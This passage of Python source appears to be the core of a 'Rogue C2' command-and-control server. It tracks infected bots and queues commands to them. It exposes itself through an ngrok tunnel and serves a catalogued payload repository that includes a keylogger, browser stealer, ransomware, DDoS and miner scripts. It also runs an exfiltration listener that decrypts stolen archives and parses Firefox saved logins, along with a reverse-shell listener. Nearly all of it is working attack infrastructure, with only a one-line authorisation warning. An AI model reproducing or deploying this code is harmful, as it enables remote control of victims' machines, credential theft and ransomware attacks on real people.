            last_seen_str = bot_info[bot_id].get('last_seen')
            if last_seen_str:
                last_seen_time = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
                seconds_ago = int((current_time - last_seen_time).total_seconds())
                
                if seconds_ago > 300:  # 5 minutes
                    bots_to_remove.append(bot_id)
                else:
                    bot_list.append({
                        'id': bot_id,
                        'ip': bot_info[bot_id].get('ip', 'Unknown'),
                        'implant_id': bot_info[bot_id].get('implant_id', 'unknown'),
                        'last_seen': last_seen_str,
                        'last_seen_diff': seconds_ago,
                        'beacon_count': bot_info[bot_id].get('beacon_count', 0),
                        'commands_sent': bot_info[bot_id].get('commands_sent', 0),
                        'results_received': bot_info[bot_id].get('results_received', 0)
                    })
    
    # Remove old bots
    for bot_id in bots_to_remove:
        connected_bots.discard(bot_id)
        if bot_id in bot_info:
            del bot_info[bot_id]
    
    # Sort by most recent
    bot_list.sort(key=lambda x: x['last_seen_diff'])
    
    pending_count = sum(len(cmds) for cmds in pending_commands.values())
    
    # Get ngrok URL if available
    ngrok_url = "Not available"
    try:
        r = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                ngrok_url = tunnel["public_url"]
                break
    except:
        pass
    
    # Build payload URL
    payload_url = f"{ngrok_url}/payloads/" if ngrok_url != "Not available" else f"http://localhost:{C2_PORT}/payloads/"
    
    return render_template_string(admin_html,
        time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        bot_list=bot_list,
        bot_count=len(bot_list),
        results=command_results,
        pending_commands=pending_commands,
        pending_count=pending_count,
        ngrok_url=ngrok_url,
        payload_url=payload_url,
        c2_port=C2_PORT,
        exfil_port=EXFIL_PORT
    )

@app.route('/command', methods=['POST'])
def add_command():
    """Add command for a bot"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command = data.get('command')
        
        if not beacon_id or not command:
            return jsonify({'error': 'Missing beacon_id or command'}), 400
        
        pending_commands[beacon_id].append(command)
        
        print(f"[+] Command queued for {beacon_id}: {command}")
        
        return jsonify({
            'status': 'queued',
            'command_id': f"cmd_{int(time.time())}_{len(pending_commands[beacon_id])}",
            'beacon_id': beacon_id
        })
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/clear_pending/<bot_id>', methods=['POST'])
def clear_pending(bot_id):
    """Clear pending commands for a bot"""
    if bot_id in pending_commands:
        pending_commands[bot_id] = []
        print(f"[+] Cleared pending commands for {bot_id}")
        return jsonify({'status': 'cleared', 'bot_id': bot_id})
    return jsonify({'error': 'Bot not found'}), 404

@app.route('/beacons')
def list_beacons():
    """List all active beacons"""
    return jsonify({
        'beacons': list(connected_bots),
        'total': len(connected_bots),
        'server_time': datetime.now().isoformat()
    })

@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    """Serve payload files directly from the payloads directory"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    file_path = os.path.join(payload_dir, filename)
    
    if os.path.exists(file_path) and os.path.isfile(file_path):
        # Check file extension for proper content type
        if filename.endswith('.py'):
            content_type = 'text/plain'
        else:
            content_type = 'application/octet-stream'
        
        with open(file_path, 'rb') as f:
            response = f.read()
        
        return response, 200, {'Content-Type': content_type}
    return "Payload not found", 404

@app.route('/payloads/')
def list_payloads():
    """List available payloads"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    files = []
    if os.path.exists(payload_dir):
        files = os.listdir(payload_dir)
    
    html = f"""
    <html>
    <head>
        <title>Rogue C2 Payload Repository</title>
        <style>
            body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }}
            h1 {{ color: #0f0; }}
            ul {{ list-style: none; padding: 0; }}
            li {{ margin: 10px 0; padding: 10px; background: #151515; border: 1px solid #333; }}
            a {{ color: #0ff; text-decoration: none; }}
            a:hover {{ color: #fff; text-decoration: underline; }}
            .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
            .warning {{ border: 2px solid #ff6600; background: #3a1a1a; }}
        </style>
    </head>
    <body>
        <h1>Rogue C2 Payload Repository</h1>
        <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
        <ul>
    """
    
    # Organize payloads by category
    payload_categories = {
        'Reconnaissance': ['sysrecon.py', 'network_scanner.py'],
        'Privilege Escalation': ['linpeas_light.py', 'persistence.py'],
        'Credential Access': ['hashdump.py', 'browserstealer.py'],
        'Collection': ['keylogger.py', 'screenshot.py'],
        'Defense Evasion': ['logcleaner.py', 'defense_evasion.py'],
        'Lateral Movement': ['sshspray.py', 'autodeploy.py', 'lateral_movement.py'],
        'Command & Control': ['dnstunnel.py'],
        'Impact': ['ddos.py', 'mine.py', 'fileransom.py'],
        'Persistence': ['polyloader.py']
    }
    
    for category, payloads in payload_categories.items():
        html += f'<h2>{category}</h2>'
        for payload in payloads:
            if payload in files:
                warning_class = 'warning' if payload == 'fileransom.py' else ''
                html += f'''
                <li class="{warning_class}">
                    <a href="/payloads/{payload}">{payload}</a>
                    <div class="payload-info">
                        Size: {os.path.getsize(os.path.join(payload_dir, payload)) // 1024} KB | 
                        <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
                        <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
                    </div>
                </li>
                '''
    
    html += """
        </ul>
        <script>
            function sendToAll(command) {
                if (command.includes('fileransom')) {
                    if (!confirm('⚠️ WARNING: File encryption payload is DESTRUCTIVE!\\n\\nOnly use in authorized test environments.\\n\\nContinue?')) {
                        return;
                    }
                }
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: 'all',
                        command: command
                    })
                }).then(() => alert('Command sent to load payload'));
            }
        </script>
    </body>
    </html>
    """
    
    return html

@app.route('/ngrok_status')
def ngrok_status():
    """Check ngrok status"""
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                return jsonify({
                    'status': 'active',
                    'url': tunnel["public_url"],
                    'proto': tunnel["proto"]
                })
        return jsonify({'status': 'no_tunnels'})
    except:
        return jsonify({'status': 'error', 'message': 'Ngrok not running'})

# ==================== EXFIL LISTENER ====================

def exfil_listener():
    """Exfiltration listener for encrypted data"""
    exfil_server = socket.socket()
    exfil_server.bind(('0.0.0.0', EXFIL_PORT))
    exfil_server.listen(5)
    print(f"[EXFIL] Listening on port {EXFIL_PORT} for incoming encrypted data...")

    while True:
        conn, addr = exfil_server.accept()
        print(f"[EXFIL] Receiving from {addr[0]}...")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        raw_file = f"exfil_raw_{addr[0].replace('.', '_')}.bin"
        with open(raw_file, "wb") as f:
            f.write(data)
        print(f"[EXFIL] Raw dump saved: {raw_file}")

        try:
            nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
            cipher = AES.new(EXFIL_DECRYPT_KEY, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_file = f"exfil_dec_{addr[0].replace('.', '_')}_{ts}.zip"
            with open(out_file, "wb") as f:
                f.write(plaintext)
            print(f"[EXFIL] Decrypted archive saved: {out_file}")

            extracted_dir = out_file + "_unzipped"
            with zipfile.ZipFile(out_file, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)

            for root, _, files in os.walk(extracted_dir):
                for file in files:
                    if file == "logins.json":
                        path = os.path.join(root, file)
                        print(f"\n Parsing Firefox logins.json: {path}")
                        with open(path, "r", encoding="utf-8") as f:
                            data = json.load(f)
                            for entry in data.get("logins", []):
                                print(f" - Site: {entry.get('hostname')}")
                                print(f"   Username (enc): {entry.get('encryptedUsername')}")
                                print(f"   Password (enc): {entry.get('encryptedPassword')}")
        except Exception as e:
            print(f"[!] Decryption failed: {e}")

# ==================== REVERSE SHELL LISTENER ====================

def reverse_shell_listener():
    """Reverse shell listener"""
    server = socket.socket()
    server.bind(('0.0.0.0', 9001))
    server.listen(5)
    print("[REVERSE SHELL] Listening on port 9001...")
    while True:
        conn, addr = server.accept()
        print(f"[REVERSE SHELL] Connection from {addr}")
        threading.Thread(target=handle_reverse_shell, args=(conn, addr)).start()

def handle_reverse_shell(conn, addr):
    """Handle reverse shell session"""
    try:
        conn.send(b"Rogue C2 Reverse Shell - Connected\n")
        while True:
            conn.send(b"$ ")
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            conn.send(output.encode() + b"\n")
    except:
        pass
    finally:
        conn.close()
        print(f"[REVERSE SHELL] Disconnected from {addr}")

# ==================== STARTUP ====================

def start_ngrok(port=C2_PORT):
    """Start ngrok tunnel"""
    # Kill any existing ngrok processes
    subprocess.run(["pkill", "-f", "ngrok"], stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    # Start new ngrok tunnel
    subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.DEVNULL)
    time.sleep(5)
    
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                return tunnel["public_url"]
    except Exception as e:
        print(f"[!] Ngrok failed: {e}")
    return None

def start_payload_server():
    """Start HTTP server for payloads (optional - kept for backward compatibility)"""
    payload_path = os.path.join(os.getcwd(), "payloads")
    if not os.path.exists(payload_path):
        os.makedirs(payload_path, exist_ok=True)
        print(f"[!] Created payloads directory: {payload_path}")
        print(f"[✓] Payloads will be served via Flask at /payloads/")

    # Payloads are served directly by Flask at /payloads/

def main():
    """Main startup function"""
    print("\n" + "="*60)
    print(" ROGUE C2 SERVER - Complete Command & Control")
    print("="*60)
    
    # Start listeners in threads
    threading.Thread(target=exfil_listener, daemon=True).start()
    print(f"[✓] Exfil listener started on port {EXFIL_PORT}")
    
    threading.Thread(target=reverse_shell_listener, daemon=True).start()
    print(f"[✓] Reverse shell listener started on port 9001")
    
    # Initialize payloads directory
    start_payload_server()
    
    # Start ngrok
    print("[*] Starting ngrok tunnel...")
    ngrok_url = start_ngrok()
    
    if ngrok_url:
        hostname = ngrok_url.replace("https://", "").replace("http://", "").rstrip("/")
        print(f"\n[✓] C2 SERVER IS LIVE!")
        print(f"[NGROK] C2 URL: {ngrok_url}")
        print(f"[NGROK] Hostname: {hostname}")
        print(f"[NGROK] Payloads: {ngrok_url}/payloads/")
        print(f"\n[→] Set in implant:")
        print(f"    C2_HOST = '{hostname}'")
        print(f"    C2_PORT = 443")
        print(f"    PAYLOAD_REPO = '{ngrok_url}/payloads/'")
    else:
        print("[!] Ngrok tunnel failed. Using localhost.")
        print(f"[→] Local C2: http://localhost:{C2_PORT}")
        print(f"[→] Local Payloads: http://localhost:{C2_PORT}/payloads/")
    
    print(f"\n[ADMIN] Web Panel: http://localhost:{C2_PORT}/admin")
    print(f"[EXFIL] Listener: 0.0.0.0:{EXFIL_PORT}")
    print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
    print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
    print("\n" + "="*60)
    
    # Start Flask server
    app.run(host='0.0.0.0', port=C2_PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()
